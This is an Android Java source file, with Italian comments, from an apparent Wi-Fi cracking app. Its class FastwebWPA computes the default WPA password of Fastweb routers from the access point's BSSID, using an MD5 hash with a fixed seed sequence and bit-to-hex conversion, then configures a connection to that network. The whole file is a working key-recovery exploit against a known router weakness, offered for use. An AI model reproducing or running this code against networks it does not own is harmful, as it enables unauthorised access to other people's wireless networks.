package it.creazioni;

import java.util.Vector;

import android.content.Context;
import android.net.wifi.WifiManager;


public class FastwebWPA extends VulnWifi {


	
	public FastwebWPA(String bssid, String essid, WifiManager wifiManager,Context con){
		setManager(wifiManager);
		setContext(con);
		setESSID(essid);
		setBSSID(bssid);
		counterpass=0;
		le_pass=crackMe();
		configNet();
		
	}
	public Vector<String> crackMe() {
		final String seq_20 = new String("223311340281FA22114168111201052271421066");
		//Byte[] aa=new Byte[2];
		String result= this.hash(bssid_router.replaceAll(":", "")+seq_20,"MD5");
		//inizio trasformo in squenza binaria
		String aa1 =result.substring(0, 4);
		String aa2 =result.substring(4, 8);
		int i = Integer.parseInt(aa1,16);
	    String by = Integer.toBinaryString(i);
	    //faccio padding per arrivare a 16 bit
	    while(by.length()<16){
	    	by="0"+by;
	    }
	    int i2 = Integer.parseInt(aa2,16);
	    String by2 = Integer.toBinaryString(i2);
	    //faccio padding per arrivare a 16 bit
	    while(by2.length()<16){
	    	by2="0"+by2;
	    }
	    String fin=new String (by+by2);
	    //fine trasformazione sequenza binaria
	    //inizio trasformazione sequenza di ogni 5 bit della stringa in valore hex
	    String risultato= new String();
	    for (int e=0;e<5;e++){
	    	int ww=Integer.parseInt(fin.substring(e*5,(e+1)*5),2);
	    	ww=ww > 10 ? ww+87: ww;
	    	String hexString = Integer.toHexString(ww);
	    	//padding per avere il doppio digit in hex esempio:0x4 ->0x04
	    	hexString=hexString.length()==1?"0"+hexString:hexString;
	    	risultato= risultato+hexString ;
	    }
	    Vector<String> pwd=new Vector<String>();
	    pwd.add(risultato);
	    
		return pwd;
	}

}
